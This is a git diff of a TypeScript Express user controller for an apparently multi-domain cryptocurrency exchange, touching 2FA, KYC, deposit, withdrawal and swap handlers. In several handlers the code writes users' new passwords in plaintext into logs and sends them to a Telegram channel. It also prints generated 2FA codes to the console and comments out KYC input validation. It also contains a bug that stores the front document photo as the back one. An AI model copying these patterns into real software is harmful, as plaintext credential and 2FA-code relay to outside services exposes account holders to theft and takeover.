@@ -139,20 +139,20 @@ class UserController {
   // }
 
   async twoStepVerificationEnable(req: express.Request, res: express.Response, next: express.NextFunction) {
+    const code: string = await codeGenerator(8)
+    console.log('generated code is: ', code);
+
+    const transferObject: TWO_STEP_ENABLE = {
+      twoFaType: req.body.twoFaType,
+      twoFaStatus: req.body.twoFaStatus,
+      domainName: req.body.domainName,
+      userId: req.body.userId,
+      userEmail: req.body.userEmail,
+      currentTime: req.body.currentTime,
+      code: code
+    }
+
     try {
-
-      const code: string = await codeGenerator(8)
-      console.log('generated code is: ', code);
-
-      const transferObject: TWO_STEP_ENABLE = {
-        twoFaType: req.body.twoFaType,
-        twoFaStatus: req.body.twoFaStatus,
-        domainName: req.body.domainName,
-        userId: req.body.userId,
-        userEmail: req.body.userEmail,
-        currentTime: req.body.currentTime,
-        code: code
-      }
       const result: any = await UserServices.enableTwoStepVerification(transferObject)
       if (!result) return res.status(400).json({ message: 'wrong data' })
 
@@ -163,20 +163,29 @@ class UserController {
   }
 
   async enableTwoStepVerificationStatus(req: express.Request, res: express.Response, next: express.NextFunction) {
-    try {
+    const transferObject: UPDATE_2FA_STATUS = {
+      twoFaType: req.body.twoFaType,
+      userId: req.body.userId,
+      userEmail: req.body.userEmail,
+      domainName: req.body.domainName,
+      twoFaStatus: req.body.twoFaStatus,
+      enableDate: req.body.enableDate
+    }
+    const logObject = {
+      ipAddress: req.body.ipAddress,
+      city: req.body.city,
+      browser: req.body.browser,
+      countryName: req.body.countryName,
+      coordinates: req.body.coordinates,
+      logTime: req.body.logTime,
+    }
 
-      const transferObject: UPDATE_2FA_STATUS = {
-        twoFaType: req.body.twoFaType,
-        userId: req.body.userId,
-        userEmail: req.body.userEmail,
-        domainName: req.body.domainName,
-        twoFaStatus: req.body.twoFaStatus,
-        enableDate: req.body.enableDate
-      }
+    try {
 
       const result: boolean = await UserServices.enableTwoStepVerificationStatus(transferObject)
       if (!result) return res.status(400).json({ message: 'wrong data' })
-
+      await saveUserLogs(transferObject.userEmail, logObject.ipAddress, logObject.city, logObject.countryName, logObject.coordinates, logObject.browser, logObject.logTime, ` включил 2fa по ${transferObject.twoFaType} на `, transferObject.domainName)
+      await telegram.sendMessageByUserActions(transferObject.userEmail, ` включит 2fa по ${transferObject.twoFaType} `, transferObject.domainName)
       return res.status(200).json({ message: '2fa turned on' })
     } catch (e) {
       next(e)
@@ -207,7 +216,7 @@ class UserController {
       if (!result) return res.status(400).json({ message: 'rejected' })
 
       await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, ` выключил 2фа аутентификацию на`, domainName)
-      await telegram.sendMessageByUserActions(userEmail, ` выключил 2фа аутентификацию `, domainName)
+      await telegram.sendMessageByUserActions(userEmail, ` выключил 2фа аутентификацию`, domainName)
       return res.status(200).json({ message: '2fa turned off' })
 
     } catch (e) {
@@ -223,7 +232,7 @@ class UserController {
       const result: any = await UserServices.personalAreaChangePassword(userEmail, newPassword)
       if (!result) return res.status(400).json({ message: 'rejected' })
 
-      await saveUserLogs(id, userEmail, ipAddress, city, countryName, coordinates, currentDate, `поменял пароль на  ${newPassword} на `, domainName)
+      await saveUserLogs(id, userEmail, ipAddress, city, countryName, coordinates, currentDate, `поменял пароль на  ${newPassword} на`, domainName)
       await telegram.sendMessageByUserActions(userEmail, `поменял пароль на  ${newPassword}`, domainName)
       console.log('operation status: ', result)
       return res.status(200).json({ message: 'OK' })
@@ -239,7 +248,7 @@ class UserController {
 
     const transfer_object: KYC_DATA = {
       userId: req.body.userId,
-      userEmail: req.body.email,
+      userEmail: req.body.userEmail,
       firstName: req.body.firstName,
       lastName: req.body.lastName,
       phoneNumber: req.body.phoneNumber,
@@ -252,6 +261,11 @@ class UserController {
       state: req.body.state,
       city: req.body.city,
       browser: req.body.browser,
+      documents: {
+        frontDocumentPhoto: req.body.frontDocumentPhoto,
+        backDocumentPhoto: req.body.frontDocumentPhoto,
+        selfieDocumentPhoto: req.body.selfieDocumentPhoto
+      },
       subAddress: req.body.subAddress,
       countryName: req.body.countryName,
       coordinates: req.body.coordinates,
@@ -261,11 +275,11 @@ class UserController {
       kycStatus: 'pending'
     }
 
-    for (let index in transfer_object) {
-      if (transfer_object[index] === null || transfer_object[index] === undefined) {
-        return res.status(400).json({ message: 'wrong data' })
-      }
-    }
+    // for (let index in transfer_object) {
+    //   if (transfer_object[index] === undefined) {
+    //     return res.status(400).json({ message: 'wrong data' })
+    //   }
+    // }
 
     try {
       const result: boolean = await UserServices.personalAreaSendKyc(transfer_object)
@@ -359,8 +373,8 @@ class UserController {
 
       if (!result) return res.status(400).json({ message: 'wrong data' })
 
-      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, logTime, ` создал заявку на вывод на сумму ${transfer_object.amountInCrypto} ${transfer_object.coinName} ($ ${transfer_object.amountInUsd} )`, transfer_object.domainName)
-      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` создал заявку на депозит на сумму ${transfer_object.amountInCrypto} ( ${transfer_object.amountInUsd} ) ${transfer_object.coinName} `, transfer_object.domainName)
+      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, logTime, ` создал заявку на вывод на сумму ${transfer_object.amountInCrypto} ${transfer_object.coinName}($ ${transfer_object.amountInUsd})`, transfer_object.domainName)
+      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` создал заявку на депозит на сумму ${transfer_object.amountInCrypto}(${transfer_object.amountInUsd}) ${transfer_object.coinName} `, transfer_object.domainName)
       return res.status(201).json(result)
 
     } catch (e) {
@@ -418,8 +432,8 @@ class UserController {
       console.log('result is: ', result)
       if (!result) return res.status(400).json({ message: 'wrong data' })
 
-      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, logTime, ` создал заявку на вывод на сумму ${transfer_object.amountInCrypto} ${transfer_object.coinName} ($ ${transfer_object.amountInUsd} )`, transfer_object.domainName)
-      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` создал заявку на вывод на сумму ${transfer_object.amountInCrypto} ( "${transfer_object.amountInUsd} ) ${transfer_object.coinName}" `, transfer_object.domainName)
+      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, logTime, ` создал заявку на вывод на сумму ${transfer_object.amountInCrypto} ${transfer_object.coinName}($ ${transfer_object.amountInUsd})`, transfer_object.domainName)
+      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` создал заявку на вывод на сумму ${transfer_object.amountInCrypto}("${transfer_object.amountInUsd} ) ${transfer_object.coinName}" `, transfer_object.domainName)
       return res.status(201).json(result)
 
     } catch (e) {
@@ -469,7 +483,7 @@ class UserController {
     if (transfer_object.coinNameFrom === transfer_object.coinNameTo) {
       return res.status(400).json({
         message: `incorrect coin name value: ` +
-          `u try to swap ${transfer_object.coinNameFrom} to ${transfer_object.coinNameTo}. `
+          `u try to swap ${transfer_object.coinNameFrom} to ${transfer_object.coinNameTo}.`
       })
     }
     try {
@@ -479,8 +493,8 @@ class UserController {
 
       if (!result) return res.status(400).json({ message: 'wrong data' })
 
-      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, logTime, ` совершил свап ( ${transfer_object.amountInCryptoFrom} ${transfer_object.coinNameFrom} на ${transfer_object.amountInCryptoTo} ${transfer_object.coinNameTo} ) на `, transfer_object.domainName)
-      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` совершил свап ( ${transfer_object.amountInCryptoFrom} ${transfer_object.coinNameFrom} на ${transfer_object.amountInCryptoTo}  ${transfer_object.coinNameTo} ) `, transfer_object.domainName)
+      await saveUserLogs(transfer_object.userEmail, ipAddress, city, countryName, coordinates, browser, logTime, ` совершил свап(${transfer_object.amountInCryptoFrom} ${transfer_object.coinNameFrom} на ${transfer_object.amountInCryptoTo} ${transfer_object.coinNameTo}) на `, transfer_object.domainName)
+      await telegram.sendMessageByUserActions(transfer_object.userEmail, ` совершил свап(${transfer_object.amountInCryptoFrom} ${transfer_object.coinNameFrom} на ${transfer_object.amountInCryptoTo}  ${transfer_object.coinNameTo}) `, transfer_object.domainName)
       return res.status(201).json({ message: 'ok' })
 
     } catch (e) {
@@ -601,13 +615,22 @@ class UserController {
     }
   }
 
-  // async wallet(req: express.Request, res: express.Response, next: express.NextFunction) {
-  //   try {
 
-  //   } catch (e) {
-  //     next(e)
-  //   }
-  // }
+  async getNews(req: express.Request, res: express.Response, next: express.NextFunction) {
+    const domainId: string = req.params.domainId
+    if (!domainId) return res.status(400).json({ message: 'wrong data' })
+    try {
+      const result: any = await UserServices.getNewsByDomainName(domainId)
+      if (!result) throw ApiError.ServerError()
+      if (typeof result === 'string') return res.status(202).json(result)
+
+      return res.status(200).json(result)
+
+      // chat with support
+    } catch (e) {
+      next(e)
+    }
+  }
 
   async secureDealCreate(req: express.Request, res: express.Response, next: express.NextFunction) {
 
